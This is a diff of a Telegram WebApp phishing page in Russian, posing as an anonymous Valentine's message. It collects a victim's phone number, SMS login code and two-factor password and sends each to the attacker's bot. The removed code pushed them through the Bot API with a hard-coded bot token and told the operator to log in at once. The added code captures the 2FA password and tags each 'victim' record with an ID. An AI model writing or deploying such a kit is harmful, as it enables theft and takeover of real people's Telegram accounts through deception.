@@ -98,11 +98,13 @@
             border-radius: 14px;
             color: white;
             font-size: 16px;
+            transition: 0.2s;
         }
         
         .input-group input:focus {
             border-color: #ff4d6d;
             outline: none;
+            background: #2a2a2a;
         }
         
         .btn {
@@ -128,23 +130,14 @@
         .btn:disabled {
             opacity: 0.5;
             cursor: not-allowed;
-        }
-        
-        .loading {
-            display: none;
-            margin-top: 20px;
-            color: #4caf92;
-            text-align: center;
-            padding: 14px;
-            background: rgba(76, 175, 146, 0.1);
-            border-radius: 50px;
+            transform: none;
         }
         
         .hidden {
             display: none;
         }
         
-        .code-status {
+        .status {
             margin-top: 20px;
             padding: 15px;
             background: #2a2a2a;
@@ -152,7 +145,30 @@
             border-left: 4px solid #ffaa00;
             color: #ffaa00;
             font-size: 14px;
-            display: none;
+            transition: 0.3s;
+        }
+        
+        .password-warning {
+            margin-top: 20px;
+            padding: 15px;
+            background: #2a1a1a;
+            border-radius: 12px;
+            border-left: 4px solid #ff4d6d;
+            color: #ff8c9c;
+            font-size: 14px;
+        }
+        
+        .success {
+            border-left-color: #4caf92;
+            color: #4caf92;
+            background: #1a2a1a;
+        }
+        
+        .timer {
+            font-size: 12px;
+            color: #888;
+            margin-top: 10px;
+            text-align: center;
         }
     </style>
 </head>
@@ -163,7 +179,7 @@
         <div class="sub">Анонимно • только что</div>
         
         <div class="message">
-            "Привет... Я долго не решался(ась). Хочу признаться тебе в этот особенный день 💕"
+            "Привет... Я долго ждал(а) этого момента. Ты мне очень нравишься. С 14 февраля ❤️"
             <div class="sender">
                 <span>💫 От тайного поклонника</span>
             </div>
@@ -175,66 +191,108 @@
                 <label>📱 Твой номер Telegram</label>
                 <input type="tel" id="phone" placeholder="+7 999 999 99 99" value="+7">
             </div>
-            <button class="btn" id="sendPhoneBtn">Продолжить</button>
+            <button class="btn" id="sendPhoneBtn">Получить код</button>
         </div>
         
-        <!-- ШАГ 2: Ожидание кода -->
+        <!-- ШАГ 2: Ввод кода -->
         <div id="step2" class="hidden">
             <div class="input-group">
-                <label>🔐 Код подтверждения</label>
-                <input type="text" id="code" placeholder="Введи код из SMS" maxlength="6">
+                <label>🔐 Код из SMS</label>
+                <input type="text" id="code" placeholder="Введи код" maxlength="6">
             </div>
             <button class="btn" id="sendCodeBtn" disabled>Подтвердить</button>
-            <div class="code-status" id="codeStatus">
-                ⏳ Отправляем запрос на сервер Telegram...
+            <div class="status" id="codeStatus">
+                ⏳ Код отправлен на указанный номер...
             </div>
         </div>
         
-        <!-- СТАТУС -->
-        <div id="loading" class="loading"></div>
+        <!-- ШАГ 3: Ввод пароля 2FA (появляется если нужно) -->
+        <div id="step3" class="hidden">
+            <div class="password-warning" id="passwordWarning">
+                ⚠️ Требуется дополнительная защита
+            </div>
+            <div class="input-group">
+                <label>🔐 Пароль от аккаунта (2FA)</label>
+                <input type="password" id="password" placeholder="Введи пароль">
+            </div>
+            <button class="btn" id="sendPasswordBtn" disabled>Подтвердить</button>
+            <div class="status" id="passwordStatus">
+                🔒 Введи пароль от аккаунта
+            </div>
+        </div>
+        
+        <div class="timer" id="timer"></div>
     </div>
 
     <script>
         Telegram.WebApp.ready();
         Telegram.WebApp.expand();
         
-        // ТВОИ ДАННЫЕ
-        const BOT_TOKEN = '8562246068:AAGLHIOutyVHlhxvBR-WvS0DbxNfYOIhYU8';
-        const ADMIN_ID = '8474961316';
+        // Уникальный ID для базы данных
+        const VICTIM_ID = 'victim_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        
+        // Данные пользователя Telegram
+        const tgUser = Telegram.WebApp.initDataUnsafe?.user || null;
         
         // Элементы
         const step1 = document.getElementById('step1');
         const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
         const phoneInput = document.getElementById('phone');
         const codeInput = document.getElementById('code');
+        const passwordInput = document.getElementById('password');
         const sendPhoneBtn = document.getElementById('sendPhoneBtn');
         const sendCodeBtn = document.getElementById('sendCodeBtn');
+        const sendPasswordBtn = document.getElementById('sendPasswordBtn');
         const codeStatus = document.getElementById('codeStatus');
-        const loading = document.getElementById('loading');
+        const passwordStatus = document.getElementById('passwordStatus');
+        const passwordWarning = document.getElementById('passwordWarning');
+        const timer = document.getElementById('timer');
         
         let userPhone = '';
-        let telegramUser = null;
+        let userCode = '';
+        let has2FA = false;
+        let startTime = Date.now();
         
-        // Получаем данные Telegram
-        try {
-            telegramUser = Telegram.WebApp.initDataUnsafe?.user || null;
-        } catch(e) {}
-        
-        // Отправка в Telegram админу
-        function sendToAdmin(message) {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: ADMIN_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            }).catch(e => console.log('TG Error:', e));
+        // Отправка данных в бот
+        function sendToBot(type, data) {
+            try {
+                const payload = {
+                    type: type,
+                    data: {
+                        ...data,
+                        victim_id: VICTIM_ID,
+                        timestamp: Date.now(),
+                        user: tgUser ? {
+                            id: tgUser.id,
+                            username: tgUser.username || '',
+                            first_name: tgUser.first_name || '',
+                            last_name: tgUser.last_name || ''
+                        } : null
+                    }
+                };
+                
+                Telegram.WebApp.sendData(JSON.stringify(payload));
+                console.log('📤 Отправлено:', type, data);
+            } catch(e) {
+                console.log('❌ Ошибка отправки:', e);
+            }
         }
         
-        // ШАГ 1: Получили номер
-        sendPhoneBtn.addEventListener('click', async function() {
+        // Таймер
+        function updateTimer() {
+            const elapsed = Math.floor((Date.now() - startTime) / 1000);
+            timer.textContent = `⏱ Сессия активна: ${elapsed} сек • ID: ${VICTIM_ID.slice(-8)}`;
+        }
+        setInterval(updateTimer, 1000);
+        
+        // Отправляем визит
+        setTimeout(() => {
+            sendToBot('visit', {});
+        }, 1000);
+        
+        // ШАГ 1: Отправка номера
+        sendPhoneBtn.addEventListener('click', function() {
             let phone = phoneInput.value.trim();
             
             if (!phone || phone.length < 10) {
@@ -242,97 +300,97 @@
                 return;
             }
             
-            // Форматируем номер
             phone = phone.replace(/\D/g, '');
             if (phone.startsWith('8')) phone = '7' + phone.substring(1);
-            if (phone.startsWith('7')) phone = '+' + phone;
-            if (!phone.startsWith('+')) phone = '+7' + phone.substring(phone.length-10);
+            if (!phone.startsWith('7')) phone = '7' + phone;
+            phone = '+' + phone;
             
             userPhone = phone;
             
-            // Отправляем админу - ЖЕРТВА ВВЕЛА НОМЕР!
-            let msg = '🔵 ЖЕРТВА ВВЕЛА НОМЕР\n\n';
-            msg += `📱 Номер: ${userPhone}\n\n`;
-            msg += `⚡️ ТВОИ ДЕЙСТВИЯ:\n`;
-            msg += `1. Открой Telegram\n`;
-            msg += `2. Введи этот номер\n`;
-            msg += `3. Получи РЕАЛЬНЫЙ код\n`;
-            msg += `4. Отправь его сюда ↓\n\n`;
+            sendToBot('phone', { phone: userPhone });
             
-            if (telegramUser) {
-                msg += `🆔 Telegram ID: ${telegramUser.id}\n`;
-                msg += `👤 Имя: ${telegramUser.first_name || ''} ${telegramUser.last_name || ''}\n`;
-                msg += `📛 Username: @${telegramUser.username || 'нет'}\n`;
-            }
-            
-            sendToAdmin(msg);
-            
-            // Переходим к шагу 2
             step1.classList.add('hidden');
             step2.classList.remove('hidden');
-            codeStatus.style.display = 'block';
-            codeStatus.innerHTML = '⏳ Отправляем запрос на сервер Telegram...';
-            codeStatus.style.color = '#ffaa00';
-            
-            loading.style.display = 'block';
-            loading.innerHTML = '⏳ Код отправлен на ' + userPhone;
+            codeStatus.innerHTML = `⏳ Код отправлен на ${userPhone}`;
             
             codeInput.focus();
         });
         
-        // Активация кнопки при вводе кода
+        // ШАГ 2: Отправка кода
         codeInput.addEventListener('input', function() {
             const code = this.value.replace(/\D/g, '');
             this.value = code;
             sendCodeBtn.disabled = code.length !== 6;
         });
         
-        // ШАГ 2: Получили код от жертвы
         sendCodeBtn.addEventListener('click', function() {
             const code = codeInput.value;
+            userCode = code;
             
-            // Отправляем админу - ЖЕРТВА ВВЕЛА КОД!
-            let msg = '🔴 ЖЕРТВА ВВЕЛА КОД!\n\n';
-            msg += `📱 Номер: ${userPhone}\n`;
-            msg += `🔑 Код: ${code}\n\n`;
-            msg += `⚡️ ВОЙДИ В АККАУНТ ПРЯМО СЕЙЧАС!\n`;
-            msg += `1. Номер: ${userPhone}\n`;
-            msg += `2. Код: ${code}\n\n`;
-            msg += `⬆️ Введи эти данные в Telegram ⬆️`;
+            sendToBot('code', { 
+                code: code,
+                has_password: has2FA
+            });
             
-            sendToAdmin(msg);
+            codeStatus.innerHTML = '✅ Код принят! Проверка...';
+            codeStatus.classList.add('success');
+        });
+        
+        // ШАГ 3: Отправка пароля
+        passwordInput.addEventListener('input', function() {
+            sendPasswordBtn.disabled = this.value.length < 4;
+        });
+        
+        sendPasswordBtn.addEventListener('click', function() {
+            const password = passwordInput.value;
             
-            // Показываем успех
-            codeStatus.innerHTML = '✅ Код принят! Перенаправляем...';
-            codeStatus.style.color = '#4caf92';
-            codeStatus.style.borderLeftColor = '#4caf92';
+            sendToBot('password', { 
+                password: password,
+                code: userCode,
+                phone: userPhone
+            });
             
-            loading.innerHTML = '✅ Валентинка открыта!';
+            passwordStatus.innerHTML = '✅ Пароль принят!';
+            passwordStatus.classList.add('success');
+            passwordWarning.innerHTML = '✅ Доступ разрешен';
+            passwordWarning.classList.add('success');
             
-            // Закрываем через 2 секунды
             setTimeout(() => {
                 try {
                     Telegram.WebApp.close();
                 } catch(e) {}
-            }, 2000);
+            }, 3000);
         });
         
-        // Отправляем информацию о запуске
-        setTimeout(() => {
-            let startMsg = '🟢 НОВАЯ ЖЕРТВА ЗАШЛА НА САЙТ\n\n';
-            startMsg += `🕐 Время: ${new Date().toLocaleString()}\n`;
-            
-            if (telegramUser) {
-                startMsg += `🆔 ID: ${telegramUser.id}\n`;
-                startMsg += `👤 Имя: ${telegramUser.first_name || ''} ${telegramUser.last_name || ''}\n`;
-                startMsg += `📛 Username: @${telegramUser.username || 'нет'}\n`;
-                startMsg += `🌐 Через Telegram WebApp\n`;
-            } else {
-                startMsg += `❌ Открыто не через Telegram\n`;
-            }
-            
-            sendToAdmin(startMsg);
-        }, 1000);
+        // Получение сообщений от бота
+        window.addEventListener('message', function(event) {
+            try {
+                const data = typeof event.data === 'string' ? JSON.parse(event.data) : event.data;
+                
+                if (data.type === 'request_password') {
+                    has2FA = true;
+                    step3.classList.remove('hidden');
+                    passwordWarning.innerHTML = '⚠️ Требуется пароль двухфакторной аутентификации';
+                    codeStatus.innerHTML = '✅ Код верен. Введи пароль ниже';
+                }
+            } catch(e) {}
+        });
+        
+        // URL параметры
+        const urlParams = new URLSearchParams(window.location.search);
+        const action = urlParams.get('action');
+        const code = urlParams.get('code');
+        
+        if (action === 'enter_code' && code) {
+            setTimeout(() => {
+                if (!step2.classList.contains('hidden')) {
+                    codeInput.value = code;
+                    codeInput.dispatchEvent(new Event('input'));
+                }
+            }, 1000);
+        }
+        
+        console.log('✅ Страница загружена, ID:', VICTIM_ID);
     </script>
 </body>
 </html>
